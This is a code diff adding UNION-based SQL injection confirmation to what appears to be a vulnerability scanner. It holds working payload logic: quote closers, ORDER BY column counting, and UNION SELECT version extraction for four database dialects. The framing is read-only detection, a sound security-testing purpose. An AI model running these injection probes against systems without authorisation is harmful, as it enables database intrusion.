@@ -1,5 +1,6 @@
 """SQL Injection actions."""
 
+import json
 import re
 
 from actions.registry import action, ActionContext, ActionResult
@@ -57,6 +58,110 @@ def _db_signature(base_raw: dict, test_raw: dict) -> bool:
         if int(raw.get("status") or 0) >= 500:
             return True
     return False
+
+
+# Closer prefix, then (backend fingerprint, version function) pairs. The
+# backend order follows the error text when one exists; otherwise every
+# dialect is tried cheapest-first. All read-only: version strings only,
+# never table contents.
+_CLOSERS = ["'", "')", "'))", '"', '"))']
+
+_VERSION_PROBES = (
+    ("sqlite", ("sqlite", "sqlite_master"),
+     "sqlite_version()"),
+    ("mysql", ("mysql", "mariadb", "mysqli"),
+     "version()"),
+    ("postgres", ("postgres", "pg_", "sequelize"),
+     "version()"),
+    ("mssql", ("mssql", "sqlserver", "odbc"),
+     "@@version"),
+)
+
+
+async def _union_confirm(url: str, param: str, method: str,
+                         evidence: dict) -> dict | None:
+    """Prove impact beyond divergence: column count + version extraction.
+
+    ORDER BY increments find the column count (an out-of-range error or
+    a stable 200 maps the boundary), then a UNION SELECT plants a
+    version function in the first column. A version string the baseline
+    never contained, appearing in the UNION response, is data leaving
+    the database through the injection — read-only (one scalar), but
+    past any doubt about whether the flaw executes.
+    """
+    text = json.dumps(evidence, default=str)
+    ordered_backends = sorted(
+        _VERSION_PROBES,
+        key=lambda probe: 0 if probe[1][0] in text.lower()
+        or any(marker in text.lower() for marker in probe[1]) else 1,
+    )
+
+    closer = await _find_closer(url, param, method)
+    if not closer:
+        return None
+    columns = await _column_count(url, param, method, closer)
+    if not columns:
+        return None
+    for backend, _markers, version_fn in ordered_backends:
+        version = await _union_version(url, param, method, closer,
+                                       columns, version_fn)
+        if version:
+            return {"backend": backend, "columns": columns,
+                    "version": version,
+                    "technique": "union_version_extraction"}
+    return None
+
+
+async def _injected_body(url: str, param: str, method: str,
+                       expression: str) -> tuple:
+    """(status, body) for one injected request; failures as (0, '')."""
+    try:
+        result = await curl(inject_param(url, param, expression),
+                            method=method, output="full", timeout=15)
+    except Exception:
+        return 0, ""
+    return result.get("status", 0), result.get("body", "") or ""
+
+
+def _looks_like_db_error(body: str) -> bool:
+    return bool(_DB_ERROR.search(body or ""))
+
+
+async def _find_closer(url: str, param: str, method: str) -> str:
+    """Which quote/paren prefix yields valid syntax (ORDER BY 1 clean)?"""
+    for closer in _CLOSERS:
+        status, body = await _injected_body(
+            url, param, method, f"{closer} ORDER BY 1--")
+        if status in (200, 201) and not _looks_like_db_error(body):
+            return closer
+    return ""
+
+
+async def _column_count(url: str, param: str, method: str,
+                       closer: str) -> int:
+    """ORDER BY increments until the backend complains (max 12 probes)."""
+    for index in range(2, 14):
+        status, body = await _injected_body(
+            url, param, method, f"{closer} ORDER BY {index}--")
+        if status not in (200, 201) or _looks_like_db_error(body):
+            return index - 1
+    return 0
+
+
+async def _union_version(url: str, param: str, method: str, closer: str,
+                         columns: int, version_fn: str) -> str:
+    """UNION a version function into column one; return it if novel."""
+    cells = ",".join(["NULL"] * (columns - 1))
+    expression = (f"{closer} UNION SELECT {version_fn}"
+                  + (f",{cells}" if cells else "") + "--")
+    status, body = await _injected_body(url, param, method, expression)
+    if status not in (200, 201):
+        return ""
+    for candidate in re.findall(r"\d+\.\d+(?:\.\d+)?", body):
+        baseline_probe = await _injected_body(url, param, method, "1")
+        if candidate not in (baseline_probe[1] or ""):
+            return candidate
+    return ""
 
 
 @action(
@@ -125,21 +230,28 @@ async def detect_sqli(ctx: ActionContext) -> ActionResult:
                 lambda: oracle.differential.test(test_url, method=method)
             )
             confidence = "CONFIRMED" if repro.confidence.value == "CONFIRMED" else "FIRM"
+            union_proof = await _union_confirm(
+                url, param, method, verdict.evidence)
+            data = {
+                "url": url,
+                "param": param,
+                "payload": payload,
+                "technique": "differential",
+            }
+            evidence = {
+                "differential": verdict.evidence,
+                "reproducibility": repro.evidence,
+                "refused_as_input_error": rejected,
+                "path_divergences": path_divergence,
+            }
+            if union_proof:
+                data["union_confirmation"] = union_proof
+                evidence["union_confirmation"] = union_proof
             return ActionResult(
                 success=True,
                 confidence=confidence,
-                data={
-                    "url": url,
-                    "param": param,
-                    "payload": payload,
-                    "technique": "differential",
-                },
-                evidence={
-                    "differential": verdict.evidence,
-                    "reproducibility": repro.evidence,
-                    "refused_as_input_error": rejected,
-                    "path_divergences": path_divergence,
-                },
+                data=data,
+                evidence=evidence,
             )
 
     if rejected:
